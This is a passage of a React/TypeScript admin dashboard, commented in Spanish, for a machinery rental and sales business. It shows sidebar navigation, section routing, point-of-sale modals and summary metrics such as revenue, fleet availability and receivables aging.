                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.6"><path strokeLinecap="round" strokeLinejoin="round" d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4m7 14l5-5m0 0l-5-5m5 5H9" /></svg>Cerrar sesión
                      </button>
                    </div>
                  </div>
                </>
              )}
            </div>

            <Link to="/" className="text-xs text-mute hover:text-gold-ink transition-colors hidden lg:flex items-center gap-1.5" title="Ver sitio">
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" strokeLinejoin="round" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" /></svg>
            </Link>
          </div>
        </div>
      </div>

      {/* ─── CUERPO ─── */}
      <div className="flex-1 flex overflow-hidden">

        {/* SIDEBAR */}
        <aside className={`w-64 ${colapsado ? 'lg:w-[72px]' : 'lg:w-64'} flex-none p-2 fixed lg:static inset-y-0 left-0 z-50 transition-[transform,width] duration-300 ease-[cubic-bezier(0.23,1,0.32,1)] lg:translate-x-0 ${sidebarOpen ? 'translate-x-0' : '-translate-x-full'}`}>
          <div className="h-full bg-surface border border-edge rounded-[20px] shadow-[0_1px_3px_rgba(33,29,22,0.04)] flex flex-col p-3.5 overflow-hidden">
            <button onClick={() => setSidebarOpen(false)} className="lg:hidden self-end text-mute hover:text-ink p-1 mb-1" aria-label="Cerrar menú">
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" d="M6 6l12 12M18 6L6 18" /></svg>
            </button>
            <nav className="flex-1 overflow-y-auto flex flex-col gap-3">
              {navGroups.map((g, gi) => (
                <div key={gi}>
                  {g.title && (
                    <p className={`px-2.5 pb-2 text-[11px] font-bold uppercase tracking-wider text-mute ${colapsado ? 'lg:hidden' : ''}`}>{t(g.title)}</p>
                  )}
                  <div className="flex flex-col gap-0.5">
                    {g.items.map(it => {
                      const active = section === it.key
                      return (
                        <button
                          key={it.key}
                          onClick={() => go(it.key)}
                          title={t(`sec.${claveSec(it.key)}.title`)}
                          className={`group relative w-full flex items-center gap-2.5 px-3 py-2.5 rounded-[10px] text-sm transition-colors ${colapsado ? 'lg:justify-center lg:px-2' : ''} ${
                            active ? 'bg-gold-soft text-gold-ink font-medium' : 'text-ink hover:bg-surface-2 font-normal'
                          }`}
                        >
                          <svg className={`w-[19px] h-[19px] shrink-0 transition-colors ${active ? 'text-gold-ink' : 'text-mute group-hover:text-ink'}`} fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.75" strokeLinecap="round" strokeLinejoin="round">
                            {it.icon}
                          </svg>
                          <span className={`flex-1 text-left ${colapsado ? 'lg:hidden' : ''}`}>{t(`sec.${claveSec(it.key)}.title`)}</span>
                        </button>
                      )
                    })}
                  </div>
                </div>
              ))}
            </nav>
            <div className="border-t border-edge pt-3.5 mt-2">
              <div className={`flex items-center gap-2 px-1 mb-1.5 ${colapsado ? 'lg:justify-center' : ''}`}>
                <AvatarUsuario
                  nombre={me?.username} correo={me?.email}
                  avatarUrl={me?.avatar_url} fallbackUrl={me?.avatar_url_rol}
                  className="w-8 h-8"
                />
                <div className={`min-w-0 ${colapsado ? 'lg:hidden' : ''}`}>
                  <p className="text-[13px] font-bold text-ink truncate">{me?.username || 'admin'}</p>
                  <p className="text-[11px] text-mute truncate">{me?.email}</p>
                </div>
              </div>
              <button onClick={() => { logout(); nav('/login') }} title="Cerrar sesión" className={`w-full flex items-center gap-2 px-2 py-2 rounded-lg text-[13px] font-semibold text-mute hover:text-red-500 hover:bg-red-500/5 transition-colors ${colapsado ? 'lg:justify-center' : ''}`}>
                <svg className="w-4 h-4 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.7"><path strokeLinecap="round" strokeLinejoin="round" d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4m7 14l5-5m0 0l-5-5m5 5H9" /></svg>
                <span className={colapsado ? 'lg:hidden' : ''}>Cerrar sesión</span>
              </button>
            </div>
          </div>
        </aside>

        {/* MAIN */}
        {/* pb en móvil solo para el técnico: es a quien le sale el dock, y sin
            este respiro el dock taparía el final del contenido. */}
        {/* El scroll del panel vive AQUÍ, no en la ventana (el marco es h-screen).
            La marca le dice a <ScrollAlTope> cuál subir al cambiar de sección:
            sin ella, saltar de Rentas a Ventas te dejaba a media página. */}
        {/* `relative` no es decorativo: este <main> es el contenedor que scrollea
            el panel. Sin posicionarlo, cualquier hijo `position: absolute` —y
            `sr-only` lo es— toma como referencia el DOCUMENTO en vez de este
            panel: se escapa de su recorte y estira la página entera. Las tablas
            accesibles de las gráficas hacían justo eso y dejaban ~650 px de
            negro por debajo del contenido, con dos barras de scroll peleando. */}
        <main data-scroll-top className={`relative flex-1 overflow-auto min-w-0 ${puede?.nivel === 1 ? 'pb-24 md:pb-0' : ''}`}>
          <div className="p-3 sm:p-4 lg:p-5">
          {/* Encabezado de página: breadcrumb + título + subtítulo */}
          {!enDetalle && (
          <div className="mb-5">
            <nav className="flex items-center gap-2 text-[13px] font-semibold text-mute mb-3">
              <button onClick={() => go('resumen')} className="hover:text-ink transition-colors" title="Inicio" aria-label="Inicio">
                <svg className="w-[18px] h-[18px]" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.7"><path strokeLinecap="round" strokeLinejoin="round" d="M3 11.4L12 4l9 7.4" /><path strokeLinecap="round" strokeLinejoin="round" d="M5.5 9.8V19a1.2 1.2 0 0 0 1.2 1.2h10.6A1.2 1.2 0 0 0 18.5 19V9.8" /></svg>
              </button>
              <span aria-hidden="true" className="text-mute/70">›</span>
              <span className="text-ink font-bold">{t(`sec.${claveSec(section)}.title`)}</span>
            </nav>
            <h1 className="text-[26px] sm:text-[28px] font-extrabold tracking-tight text-ink leading-tight">{t(`sec.${claveSec(section)}.title`)}</h1>
            <p className="text-[15px] text-mute mt-1.5">{t(`sec.${claveSec(section)}.sub`)}</p>
          </div>
          )}

          {/* Cargas de dinero que fallaron: sin este aviso, los totales en $0
              parecen reales. Reintentar relanza solo los loaders afectados. */}
          {cargasFallidas.length > 0 && (
            <div className="mb-5 flex flex-wrap items-center gap-x-3 gap-y-2 rounded-xl border border-amber-500/40 bg-amber-500/10 px-4 py-3 text-[13.5px]">
              <svg className="w-[18px] h-[18px] text-taller-ink shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" strokeLinejoin="round" d="M12 9v4m0 4h.01M10.3 4.3L2.6 18a2 2 0 001.7 3h15.4a2 2 0 001.7-3L13.7 4.3a2 2 0 00-3.4 0z" /></svg>
              <span className="text-ink font-semibold">No se pudo cargar: {cargasFallidas.join(', ')}.</span>
              <span className="text-mute">Los totales pueden verse en $0 sin serlo.</span>
              <button
                onClick={() => { loadMetrics(); loadVentas(); loadRentas(); loadFacturacion(); loadCotizaciones() }}
                className="ml-auto px-3.5 py-1.5 rounded-lg bg-amber-500/20 text-taller-ink font-bold hover:bg-amber-500/30 transition-colors"
              >
                Reintentar
              </button>
            </div>
          )}
          {/* Las secciones grandes viajan en su propio archivo y se descargan al
              abrirlas. Mientras baja el archivo se ve este spinner —el mismo de
              las rutas— en vez de un hueco en blanco. */}
          <Suspense fallback={<div className="min-h-[50vh] grid place-items-center"><div className="w-8 h-8 rounded-full border-2 border-gold border-t-transparent animate-spin" role="status" aria-label="Cargando sección" /></div>}>
          {section === 'resumen' && (
            <Resumen
              equipos={equipos} categorias={categorias}
              tipos={tipos} marcas={marcas} coupons={coupons} rentas={rentas}
              unidades={unidades} ventas={ventas} me={me} go={go} metrics={metrics}
              adeudos={adeudos} pedidos={pedidos} solicitudes={solicitudes}
            />
          )}
          {section === 'equipos' && (
            <EquiposAdmin
              equipos={equipos} categorias={categorias} tipos={tipos} marcas={marcas}
              reload={() => { loadEquipos(); loadUnidades() }} notify={notify}
              cargando={!listo('equipos')}
            />
          )}
          {section === 'inventario' && (
            <InventarioGlobal
              unidades={unidades} equipos={equipos}
              reload={() => { loadUnidades(); loadRentas(); loadRefacciones() }} notify={notify}
              onEnviarTaller={abrirReparacion} cargando={!listo('unidades')}
            />
          )}
          {/* La caja pide DOS cosas para ofrecer maquinaria o rentas: el
              interruptor del NEGOCIO (Ajustes → Caja) y la capacidad de quien
              está en el mostrador. Desde que la caja es del puesto de mostrador,
              al cajero le viene apagado «Rentar» de fábrica: sin la segunda
              condición el botón saldría solo para responder 403. Si el negocio
              enciende la renta en caja, el dueño le enciende «Rentar» al puesto
              desde Permisos y el botón aparece. */}
          {section === 'caja' && (
            <CajaPOS
              notify={notify}
              unidades={unidades.map(u => ({
                id: u.id, codigo: u.codigo, estado: u.estado,
                equipo_modelo: u.equipo_modelo,
                puede_venderse: u.puede_venderse, puede_rentarse: u.puede_rentarse,
              }))}
              puedeVenderMaquina={cajaCfg.vende && puedeVer('vender')}
              puedeRentarMaquina={cajaCfg.renta && puedeVer('rentar')}
              onVenderMaquina={u => { const real = unidades.find(x => x.id === u.id); if (real) setCajaVender(real) }}
              onRentarMaquina={u => { const real = unidades.find(x => x.id === u.id); if (real) setCajaRentar(real) }}
            />
          )}
          {section === 'refacciones' && (
            <RefaccionesAdmin refacciones={refacciones} reload={loadRefacciones} notify={notify}
              cargando={!listo('refacciones')} />
          )}
          {section === 'reparaciones' && (
            <ReparacionesAdmin
              ordenes={ordenes} refacciones={refacciones} unidades={unidades} empresas={empresas}
              reload={() => { loadOrdenes(); loadRefacciones(); loadUnidades() }} notify={notify}
              abrirId={ordenAbrir} onAbierto={() => setOrdenAbrir(null)}
              cargando={!listo('reparaciones')}
            />
          )}
          {section === 'facturacion' && (
            <FacturacionAdmin solicitudes={solicitudes} reload={loadFacturacion} notify={notify}
              cargando={!listo('facturación')} />
          )}
          {section === 'adeudos' && (
            <AdeudosAdmin datos={adeudos} pedidos={pedidos} reload={loadAdeudos} reloadApartados={loadPedidos} notify={notify}
              cargando={!listo('adeudos')} />
          )}
          {section === 'pedidos' && (
            <PedidosAdmin datos={pedidos} reload={loadPedidos} equipos={equipos} empresas={empresas} notify={notify}
              cargando={!listo('pedidos')} />
          )}
          {section === 'cotizaciones' && (
            <CotizacionesAdmin empresas={empresas} notify={notify} irAInventario={() => go('inventario')} irARentas={(id) => { fijarRentaAAbrir(id); go('rentas') }} irAVentas={(id) => { fijarVentaAAbrir(id); go('ventas') }} />
          )}
          {section === 'catalogos' && (
            <CatalogosAdmin
              categorias={categorias} tipos={tipos} marcas={marcas} equipos={equipos}
              reload={loadCatalogos} notify={notify} go={go}
            />
          )}
          {section === 'rentas' && (
            <div className="space-y-4">
              {/* Arriba de la lista a propósito: lo primero al entrar a Rentas
                  es a quién hay que insistirle hoy, no el histórico. */}
              <RecordatoriosRentas />
              <RentasAdmin reload={() => { loadRentas(); loadUnidades() }} notify={notify} />
            </div>
          )}
          {section === 'ventas' && (
            <VentasAdmin notify={notify} />
          )}
          {section === 'cupones' && (
            <CuponesAdmin coupons={coupons} reload={loadCoupons} notify={notify} cargando={!listo('cupones')} />
          )}
          {section === 'clientes' && (
            <ClientesAdmin puede={puede} notify={notify} reloadBadge={loadClientesTotal} />
          )}
          {section === 'ubicaciones' && (
            <UbicacionesAdmin
              notify={notify} empresas={empresas} unidades={unidades}
              onOrdenCreada={() => { loadOrdenes(); loadUnidades() }}
            />
          )}
          {section === 'equipo' && <EquipoAdmin usuarios={usuarios} reload={loadUsuarios} notify={notify} yoId={me?.id} cargando={!listo('usuarios')} />}
          {section === 'permisos' && <PermisosAdmin notify={notify} />}
          {section === 'configuracion' && <ConfiguracionAdmin notify={notify} lang={lang} onLang={cambiarIdioma} />}
          {/* El menú de la cuenta lleva aquí desde siempre y aquí no había nada:
              salía el encabezado, el pie justo debajo y ni un dato. La pantalla
              ya estaba escrita, viviendo dentro de Configuración → Cuenta. */}
          {section === 'perfil' && <PerfilAdmin notify={notify} />}
          </Suspense>

          {/* Firma del sistema: cierra el panel como cierra la tienda. Pegado a
              lo de arriba: separado se leía como una sección más, y no lo es —
              es el borde inferior de lo que ya terminaste de leer. */}
          <PieByRix className="mt-3" />
          </div>
        </main>
      </div>

      {/* ─── DOCK DEL TÉCNICO (solo móvil) ───
          Solo nivel 1. El admin y el dueño manejan ~15 módulos: no caben en un
          dock, para ellos queda el cajón lateral. El técnico ve tres cosas, así
          que un dock al alcance del pulgar le sirve mejor que un menú que abrir.
          Los items salen de navGroups, que ya está filtrado por rol. */}
      {puede?.nivel === 1 && (
        <Dock
          items={navGroups.flatMap(g => g.items).map<DockItem>(it => ({
            key: it.key,
            // Etiqueta corta: "Configuración" no cabe bajo un icono de dock.
            // La larga se queda en el cajón lateral.
            label: ({ ubicaciones: 'Jornada', configuracion: 'Ajustes' } as Record<string, string>)[it.key] ?? it.label,
            badge: it.badge,
            activo: section === it.key,
            onClick: () => go(it.key),
            icon: (
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.75" strokeLinecap="round" strokeLinejoin="round">
                {it.icon}
              </svg>
            ),
          }))}
        />
      )}

      <DialogoHost />

      {invEquipo && <InventoryModal equipo={invEquipo} onClose={() => setInvEquipo(null)} notify={notify} />}

      {/* Las hojas que la CAJA pide. Viven aquí, no en CajaPOS, para que exista
          una sola hoja de venta y una sola de renta en todo el panel. */}
      {cajaVender && (
        <SellModal
          unit={cajaVender} equipo={equipoFromUnit(cajaVender)} desdeCaja
          onClose={() => setCajaVender(null)}
          onDone={() => { setCajaVender(null); loadUnidades(); loadMetrics() }}
          notify={notify}
        />
      )}
      {cajaRentar && (
        <RentModal
          unit={cajaRentar} equipo={equipoFromUnit(cajaRentar)} desdeCaja
          onClose={() => setCajaRentar(null)}
          onDone={() => { setCajaRentar(null); loadUnidades(); loadRentas(); loadMetrics() }}
          notify={notify}
        />
      )}

      {paletteOpen && (
        <CommandPalette
          equipos={equipos} unidades={unidades} rentas={rentas} ventas={ventas}
          go={go} onClose={() => setPaletteOpen(false)}
        />
      )}
    </div>
    </ProveedorPermisos>
  )
}

/* ════════════════════════════════════════
   RESUMEN
════════════════════════════════════════ */
/* (AreaChart eliminado: el Resumen usa los widgets del comp de Claude Design) */

/** Los minutos SIEMPRE de dos dígitos: "1:04", nunca "1:4". */
const FORMATO_MINUTOS = { minimumIntegerDigits: 2 } as const

/** Reloj del resumen con dígitos de marcador: cada dígito que cambia RUEDA
 *  (el viejo sale hacia arriba, el nuevo entra desde abajo). Los que no
 *  cambian no se mueven — al cambiar de minuto solo giran los necesarios.
 *
 *  El tic vive AQUÍ, no en Resumen. Cuando estaba arriba, cada segundo
 *  repintaba las nueve tarjetas del resumen y volvía a recorrer unidades,
 *  rentas, ventas y equipos (~17 pasadas por segundo) para pintar un reloj.
 *  Con el tic dentro, solo se repinta el reloj. */
function RelojVivo() {
  const [now, setNow] = useState(() => new Date())
  useEffect(() => { const t = setInterval(() => setNow(new Date()), 1000); return () => clearInterval(t) }, [])
  let h = now.getHours() % 12
  if (h === 0) h = 12
  const ampm = now.getHours() < 12 ? 'AM' : 'PM'
  // Helvetica/Arial: su "1" es un trazo simple y recto, sin la patita/serif
  // que tenían la monoespaciada y el sans black (que no gustaban).
  const fuenteNum = "'Helvetica Neue', Helvetica, Arial, sans-serif"
  return (
    <div className="flex items-baseline gap-2 mt-5">
      {/* El rodado de los dígitos lo hace NumberFlow, igual que las cifras de
          dinero del panel: antes era un AnimatePresence a mano que montaba y
          desmontaba un <span> por carácter.

          `trend={1}` no es adorno: sin él, al pasar de :59 a :00 NumberFlow ve
          que el número BAJÓ y gira los dígitos hacia atrás, como si el reloj se
          regresara. Fijado en 1, siempre avanzan hacia arriba.

          El grupo sincroniza el tiempo de las dos animaciones; sin él, la hora
          y los minutos ruedan cada quien por su lado en los cambios de hora. */}
      <NumberFlowGroup>
        <div className="flex items-baseline text-[46px] leading-none font-bold tracking-[-0.02em] text-ink tabular-nums" style={{ fontFamily: fuenteNum }}>
          {/* Los dos puntos van como `suffix` de la hora, NO como un <span>
              hermano. De hermano quedaban flotando arriba: NumberFlow trae su
              propia caja y el flex estiraba el span a esa altura, dejando el
              glifo pegado al techo. Dentro del número, los pinta NumberFlow
              sobre la misma línea base que los dígitos y el problema no existe. */}
          <NumberFlow value={h} trend={1} suffix=":" />
          <NumberFlow value={now.getMinutes()} trend={1} format={FORMATO_MINUTOS} />
        </div>
      </NumberFlowGroup>
      <span className="text-[16px] font-bold text-mute" style={{ fontFamily: fuenteNum }}>{ampm}</span>
    </div>
  )
}

function Resumen({ equipos, rentas, unidades, ventas, me, go, metrics, adeudos, pedidos, solicitudes }: {
  equipos: Equipo[]; categorias: Option[]; tipos: Option[]; marcas: Option[]
  coupons: Coupon[]; rentas: RentaActiva[]; unidades: Unidad[]; ventas: Venta[]
  me: { username?: string; email?: string } | null; go: (s: Section) => void
  metrics: DashMetrics | null
  adeudos: AdeudosDatos; pedidos: PedidosDatos; solicitudes: SolicitudFactura[]
}) {
  // Pesos redondos. Es el mismo `dinero` de las gráficas: los centavos en una
  // cifra de tablero son ruido, y las dos formas de escribirlos no pueden
  // separarse o el Resumen se contradice consigo mismo.
  const money0 = dinero

  // Reloj en vivo
  // El resumen solo necesita saber QUÉ DÍA es, no qué segundo: la hora la lleva
  // RelojVivo por su cuenta. Revisamos cada minuto y solo movemos el estado si
  // de verdad cambió el día (panel abierto pasada la medianoche), así el resumen
  // no se repinta ni una vez en una jornada normal.
  const [now, setNow] = useState(() => new Date())
  useEffect(() => {
    const t = setInterval(() => {
      setNow(prev => { const ahora = new Date(); return ahora.toDateString() === prev.toDateString() ? prev : ahora })
    }, 60_000)
    return () => clearInterval(t)
  }, [])
  const dateStr = now.toLocaleDateString('es-MX', { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' })
  const nombre = me?.username || 'admin'

  // Inventario por estado
  const total = unidades.length
  const disp = unidades.filter(u => u.estado === 'disponible').length
  const rent = unidades.filter(u => u.estado === 'rentado').length
  const mant = unidades.filter(u => u.estado === 'mantenimiento').length
  const vend = unidades.filter(u => u.estado === 'vendido').length
  const operativas = Math.max(total - vend, 0)
  const availabilityPct = operativas ? Math.round((disp / operativas) * 100) : 0

  // Ingresos
  const ventasActivas = ventas.filter(v => v.estado !== 'cancelada')
  const ingresoDia = equipos.reduce((a, e) => a + num(e.precio_dia), 0)
  const y = now.getFullYear(), mo = now.getMonth()
  const pad = (n: number) => String(n).padStart(2, '0')
  const hoyStr = `${y}-${pad(mo + 1)}-${pad(now.getDate())}`
  /* Un ingreso es un PAGO recibido, en la fecha en que se recibió: no el total de
     la venta el día que se registró. Un apartado de $12,350 con anticipo de
     $10,000 no fueron $12,350 ese día — fueron $10,000 ese día y el resto cuando
     el cliente liquidó. La cifra buena la da el backend (ventas + rentas); esto
     es solo el respaldo mientras carga, y cuenta con la MISMA regla para no
     contradecirla durante un parpadeo. */
  const cobradoEn = (v: Venta, prefijo: string) =>
    (v.pagos || []).reduce((a, p) => a + ((p.fecha || '').slice(0, prefijo.length) === prefijo ? num(p.monto) : 0), 0)
  // Ingreso de HOY: cifra autoritativa del backend (ventas + rentas); si aún no
  // llega, respaldo con el cálculo cliente (solo ventas) para no mostrar vacío.
  const ingresosHoy = metrics?.ingresos_hoy ?? ventasActivas.reduce((a, v) => a + cobradoEn(v, hoyStr), 0)

  // Ingresos por mes (últimos 6): del backend (ventas + rentas, sin tope). Respaldo cliente.
  // Se conserva la MEZCLA (cuánto fue renta y cuánto venta): el dato siempre
  // vino separado y la gráfica lo tiraba para pintar seis barras de un color.
  // El respaldo del navegador solo sabe de ventas, y lo dice en vez de fingir.
  const revByMonth = metrics?.ingresos_por_mes
    ? metrics.ingresos_por_mes.map(m => ({ label: m.label, ventas: m.ventas, rentas: m.rentas, total: m.total }))
    : Array.from({ length: 6 }, (_, i) => {
      const d = new Date(y, mo - (5 - i), 1)
      const key = `${d.getFullYear()}-${pad(d.getMonth() + 1)}`
      const t = ventasActivas.reduce((a, v) => a + cobradoEn(v, key), 0)
      return { label: MESES[d.getMonth()], ventas: t, rentas: 0, total: t }
    })
  const maxRev = Math.max(1, ...revByMonth.map(r => r.total))
  const ingresosTotales = revByMonth.reduce((a, r) => a + r.total, 0)
  const mesesPositivos = revByMonth.filter(r => r.total > 0).length

  // Movimientos recientes (rentas + ventas)
  /* Las insignias iban con seis hex a mano, todos calculados para fondo claro:
     en tema oscuro esos rosas y azules pálidos deslumbraban sobre el panel
     negro. Ahora salen de los tokens, que ya saben voltearse solos, y el fondo
     se deriva del mismo color con color-mix — un solo dato, no dos que se
     pueden desincronizar. */
  const tinte = (token: string) => `color-mix(in oklab, ${token} 14%, transparent)`
  const moves = [
    ...rentas.map(r => ({ esRenta: true, name: r.inventario.equipo || 'Equipo', code: r.inventario.codigo || '', status: r.vencida ? 'Vencida' : 'Rentado', color: r.vencida ? 'var(--c-vencida)' : 'var(--c-renta)', bg: tinte(r.vencida ? 'var(--c-vencida)' : 'var(--c-renta)'), ts: r.fecha_fin || '' })),
    ...ventas.map(v => ({ esRenta: false, name: v.unidad?.equipo || 'Venta mostrador', code: v.unidad?.codigo || '', status: v.estado === 'cancelada' ? 'Cancelada' : 'Vendido', color: v.estado === 'cancelada' ? 'var(--c-vencida)' : 'var(--chart-venta)', bg: tinte(v.estado === 'cancelada' ? 'var(--c-vencida)' : 'var(--chart-venta)'), ts: v.fecha || '' })),
  ].sort((a, b) => (b.ts || '').localeCompare(a.ts || '')).slice(0, 4)

  const overviewStats: KpiItem[] = [
    { label: 'Potencial por día', value: <Monto valor={ingresoDia} decimales={0} />, helper: 'con la flota entera rentada', icon: <><path d="M12 1v22" /><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" /></> },
    { label: 'Unidades disponibles', value: <Numero valor={disp} />, helper: `${availabilityPct}% de la flota operativa`, progreso: operativas ? disp / operativas : 0, icon: <><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z" /><path d="M3.3 7 12 12l8.7-5M12 22V12" /></> },
    { label: 'Rentas activas', value: <Numero valor={rentas.length} />, helper: rent ? `${rent} unidad${rent === 1 ? '' : 'es'} en obra` : 'nada en obra', icon: <><rect x="3" y="4.5" width="18" height="16" rx="2" /><path d="M3 9h18M8 3v3m8-3v3" /><path d="M12 13v3l2 1" /></> },
    { label: 'Ventas', value: <Numero valor={ventasActivas.length} />, helper: 'sin contar las canceladas', icon: <><path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z" /><path d="M3 6h18" /><path d="M16 10a4 4 0 0 1-8 0" /></> },
  ]

  // ── Requiere tu atención: los pendientes de dinero/operación de un vistazo,
  //    cada uno lleva a su módulo. Se pinta "urgente" solo si hay algo. ──
  const apartadosConSaldo = (pedidos?.pedidos || []).filter(p => Number(p.saldo || 0) > 0)
  const totalApartados = apartadosConSaldo.reduce((a, p) => a + Number(p.saldo || 0), 0)
  const porCobrar = Number(adeudos?.total || 0) + totalApartados
  const clientesDeben = (adeudos?.clientes || 0) + (pedidos?.clientes || 0)
  // Pedidos "abiertos": apartados con saldo. "Por entregar": los que ya se pagaron
  // (o el sobre-pedido ya llegó a sucursal) y solo falta entregar la unidad.
  const pedidosAbiertos = apartadosConSaldo.length
  const pedidosPorEntregar = (pedidos?.pedidos || []).filter(p => Number(p.saldo || 0) <= 0 && (!p.sobre_pedido || p.pedido_fase === 'en_sucursal')).length
  const porFacturar = solicitudes.filter(s => s.estado === 'pendiente').length
  const rentasVencidas = rentas.filter(r => r.vencida).length
  /* El TONO dice de qué habla cada cifra y el ÉNFASIS si hoy importa; son dos
     datos distintos y por eso van separados. "Rentas vencidas: 0" con tono rojo
     pero sin énfasis sale en gris: el color solo enciende cuando de verdad hay
     algo que atender. */
  const pendientes: { label: string; value: React.ReactNode; sub: string; urgente: boolean; ir: Section; tono: KpiTone; icon: React.ReactNode }[] = [
    { label: 'Por cobrar', value: <Monto valor={porCobrar} decimales={0} />, sub: clientesDeben ? `${clientesDeben} cliente${clientesDeben === 1 ? '' : 's'}` : 'al corriente', urgente: porCobrar > 0, ir: 'adeudos', tono: 'gold', icon: <><path d="M12 1v22" /><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" /></> },
    { label: 'Pedidos abiertos', value: <Numero valor={pedidosAbiertos} />, sub: pedidosPorEntregar ? `${pedidosPorEntregar} por entregar` : (pedidosAbiertos ? 'con anticipo' : 'ninguno'), urgente: pedidosPorEntregar > 0, ir: 'pedidos', tono: 'info', icon: <><path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z" /><path d="M3 6h18" /><path d="M16 10a4 4 0 0 1-8 0" /></> },
    { label: 'Por facturar', value: <Numero valor={porFacturar} />, sub: porFacturar ? 'sin timbrar' : 'nada pendiente', urgente: porFacturar > 0, ir: 'facturacion', tono: 'warning', icon: <><path d="M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8z" /><path d="M14 3v5h5M9 13h6M9 17h4" /></> },
    { label: 'Rentas vencidas', value: <Numero valor={rentasVencidas} />, sub: rentasVencidas ? 'por recoger' : 'ninguna', urgente: rentasVencidas > 0, ir: 'rentas', tono: 'danger', icon: <><path d="M10.3 4.3 2.6 18a2 2 0 0 0 1.7 3h15.4a2 2 0 0 0 1.7-3L13.7 4.3a2 2 0 0 0-3.4 0z" /><path d="M12 9v4m0 4h.01" /></> },
    { label: 'En taller', value: <Numero valor={mant} />, sub: mant ? 'en mantenimiento' : 'sin equipos', urgente: false, ir: 'inventario', tono: 'warning', icon: <><path d="M14.7 6.3a4 4 0 0 0-5.6 5.6L3 18v3h3l6.1-6.1a4 4 0 0 0 5.6-5.6l-2.5 2.5-2.1-2.1z" /></> },
  ]

  // Paleta SUAVE solo para la gráfica: la dona y esta leyenda comparten los
  // mismos --chart-* (azul aciano / verde menta / gris lavanda). Las insignias
  // de las tablas siguen con los tokens fuertes (necesitan contraste), por eso
  // los colores de chart van aparte.
  const indicators = [
    { label: 'Disponibles', sub: 'Listas para operar', value: <Numero valor={disp} />, color: 'var(--chart-libre)' },
    { label: 'Rentadas', sub: 'En obra', value: <Numero valor={rent} />, color: 'var(--chart-renta)' },
    { label: 'Mantenimiento', sub: 'En taller', value: <Numero valor={mant} />, color: 'var(--chart-taller)' },
  ]

  /** Reparto de la flota por estado, para la dona. El orden NO se ordena por
   *  tamaño: cada estado tiene su color y su lugar fijo, así el ojo no tiene que
   *  releer la leyenda cada vez que cambia el inventario. */
  const tramosFlota = [
    { clave: 'disponibles', etiqueta: 'Disponibles', valor: disp, color: 'var(--chart-libre)' },
    { clave: 'rentadas', etiqueta: 'Rentadas', valor: rent, color: 'var(--chart-renta)' },
    { clave: 'taller', etiqueta: 'En taller', valor: mant, color: 'var(--chart-taller)' },
  ]

  /* Ocupación: cuánta máquina estuvo trabajando cada día del tramo. La flota va
     por día (`techoDia`) y no como una sola cifra de hoy, porque una unidad dada
     de alta la semana pasada no estaba en la flota el mes pasado. */
  const ocupacion = (metrics?.ocupacion_por_dia || []).map(o => ({
    fecha: o.fecha, valor: o.rentadas, techoDia: o.flota,
  }))
  const ocupHoy = metrics?.ocupacion_por_dia?.[metrics.ocupacion_por_dia.length - 1]
  const ocupPct = ocupHoy && ocupHoy.flota ? Math.round((ocupHoy.rentadas / ocupHoy.flota) * 100) : 0
  const topEquipos = metrics?.top_equipos || []

  /* ── Cartera: el dinero que falta entrar, por ANTIGÜEDAD ──
     Sustituye a "Inventario por estado", que repetía las mismas tres cifras de
     la dona de arriba con otro dibujo. Esto es lo que el Resumen no decía por
     ningún lado: cuánto se debe y desde cuándo. El globito de "Adeudos" de
     arriba solo dice CUÁNTOS, y un adeudo de tres días no es uno de tres meses.

     Qué se considera vencido: la renta, cuando pasó su fecha de fin; el
     apartado, cuando pasó su fecha estimada de entrega. Un apartado sin fecha
     estimada NO se cuenta como vencido —nadie se comprometió a una— y va en
     vigente. Lo mismo la renta que todavía está en obra. */
  const cartera = (() => {
    const hoyMs = new Date(y, mo, now.getDate()).getTime()
    const dias = (iso?: string | null) => {
      if (!iso) return 0
      const d = new Date(`${String(iso).slice(0, 10)}T00:00:00`).getTime()
      return Number.isNaN(d) ? 0 : Math.floor((hoyMs - d) / 86_400_000)
    }
    const tramos = { vigente: 0, reciente: 0, viejo: 0 }
    const cuenta = { vigente: 0, reciente: 0, viejo: 0 }
    const sumar = (monto: number, vencidoHace: number) => {
      if (monto <= 0) return
      const donde = vencidoHace <= 0 ? 'vigente' : vencidoHace <= 30 ? 'reciente' : 'viejo'
      tramos[donde] += monto
      cuenta[donde] += 1
    }
    let deRentas = 0, deApartados = 0, masViejo = 0
    // Con `?? []`, no `.rentas` a secas: el resto de este componente ya lee
    // `(pedidos?.pedidos || [])`, y aquí un 200 con el cuerpo incompleto haría
    // `for (const r of undefined)` — un TypeError que se lleva el Resumen entero
    // al ErrorBoundary, o sea la pantalla "500" del panel por un campo que faltó.
    for (const r of adeudos?.rentas ?? []) {
      const saldo = num(r.saldo)
      if (saldo <= 0) continue
      deRentas += saldo
      const atraso = dias(r.fecha_fin)
      masViejo = Math.max(masViejo, atraso)
      sumar(saldo, atraso)
    }
    for (const p of pedidos?.pedidos ?? []) {
      const saldo = num(p.saldo)
